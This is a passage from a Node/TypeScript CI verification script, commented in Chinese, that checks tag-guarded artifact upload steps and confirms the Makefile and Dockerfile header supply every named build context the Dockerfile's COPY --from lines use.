    check(guarded.length >= 1, `${artifact} 缺少带 tag 守卫的上传步骤`)
    check(
      guarded.some(entry => (entry.keys.get('path') ?? '').includes('client-assets/')),
      `${artifact} 的 tag 上传必须覆盖 client-assets/(品牌产物由 transfer 搬走后剩下的 official/beta)`,
    )
    check(
      names.some(entry => (entry.keys.get('path') ?? '').startsWith('client-assets/official/')),
      `${artifact} 非 tag 时必须有一个只传 client-assets/official/** 的上传步骤(每个提交都要有可下载产物)`,
    )
  }
}

// ---- 12. 本地镜像构建入口必须提供 Dockerfile 要求的全部命名构建上下文(2026-09-23 审计 K-05) ----
//
// `COPY --from=<name>` 的 <name> 若不是 stage、也不是用户命名上下文,BuildKit 会把它当
// **镜像引用**去拉取 —— 于是 `make docker-image`(四处文档承诺的本地构建入口)会停在
// "拉取 clientassets"上,报错完全不指向真实原因(本项目历史上正是被 Docker Hub 可达性
// 坑过)。判据 = **Dockerfile 里用到的自定义上下文集合 ⊆ Makefile 提供的集合**,
// 两边任一新增/改名都会在这里红。
{
  const dockerfile = readFileSync(join(root, 'server', 'Dockerfile'), 'utf8')
  const makefile = readFileSync(join(root, 'server', 'Makefile'), 'utf8')

  const stages = new Set(
    [...dockerfile.matchAll(/^FROM\s+\S+\s+AS\s+([A-Za-z0-9_.-]+)/gimu)].map(match => match[1].toLowerCase()),
  )
  const contexts = [...new Set(
    [...dockerfile.matchAll(/^COPY\s+--from=([A-Za-z0-9_.-]+)/gimu)]
      .map(match => match[1])
      .filter(name => !stages.has(name.toLowerCase())),
  )]
  check(
    contexts.length > 0,
    'server/Dockerfile 应至少依赖一个命名构建上下文(客户端随镜像分发 + 渠道内容);'
      + '若确实都不需要了,请同时删掉 Makefile 的 --build-context 与这条断言',
  )

  const target = /^docker-image:\n((?:\t.*\n|\s*\n)*)/mu.exec(makefile)
  check(target !== null, 'server/Makefile 应有 docker-image 目标(本地镜像构建入口)')
  const body = target?.[1] ?? ''
  for (const name of contexts) {
    check(
      body.includes(`--build-context ${name}=`),
      `make docker-image 必须提供 --build-context ${name}=…(Dockerfile 的 COPY --from=${name} 是必需上下文;`
        + '缺了 BuildKit 会把该名字当镜像引用去拉取,报错不指向真实原因)',
    )
  }
  // 用法示例同样要带上下文:照抄 Dockerfile 头部注释的人会直接踩坑。
  const header = dockerfile.split('\n').filter(line => line.startsWith('#')).join('\n')
  for (const name of contexts) {
    check(
      header.includes(`--build-context ${name}=`),
      `server/Dockerfile 头部的构建示例必须带 --build-context ${name}=…(照抄示例的人会直接踩坑)`,
    )
  }
}

for (const dir of scratch) rmSync(dir, { recursive: true, force: true })

if (failures.length > 0) {
  process.stderr.write(`\nverify-ci-scripts: ${failures.length} 项断言失败\n`)
  process.exit(1)
}
process.stdout.write('verify-ci-scripts: OK — ref 形态判定唯一真源(tag→渠道集/是否发布 + 静态对拍)/'
  + '策展发布说明的两道检查(真跑)/WASM 门禁接线(W-4 用例级报告参数 + --scope 真过滤、W-5 探针参数、W-8 结论绑 HEAD 静态+动态)/'
  + 'gofmt 扫描面同源(CI ↔ server/Makefile)/'
  + '渠道发现(掩码,取值不回显)/策略/品牌必填/日志抑制/白标门禁/产物归集/'
  + '渠道仓 revision 解析的 stdout/stderr 分流(SSH deploy key 形态 + 失败分类 + 脱敏 + 唯一 EXIT trap)/'
  + '镜像装配(无 deb + 三 tag 含渠道专属)/R2 中转/R2 发布(本次版本必留 + **三个对象**的上传后大小/哈希完整性校验:版本资产/SHA256SUMS/指针,含写指针前复检)/'
  + '本地镜像构建入口的命名构建上下文/公开 artifact 守卫全部符合预期\n')
